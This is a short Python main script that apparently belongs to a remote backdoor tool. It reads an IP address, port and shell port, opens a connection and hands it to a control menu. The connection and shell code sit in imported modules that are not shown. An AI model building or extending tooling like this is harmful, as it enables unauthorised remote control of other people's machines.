from backdoor.args import get_args
from backdoor.connection import estabilish_connection
from backdoor.menu import main_menu

def main():
    cons = []
    addrs = []
    ip_addr, port, shell_port = get_args()
    conn, addr = estabilish_connection(ip_addr, port)
    cons.append(conn)
    addrs.append(addr)
    main_menu(cons, addrs, ip_addr, port, shell_port)
    return 0
    

if __name__ == "__main__":
    main()
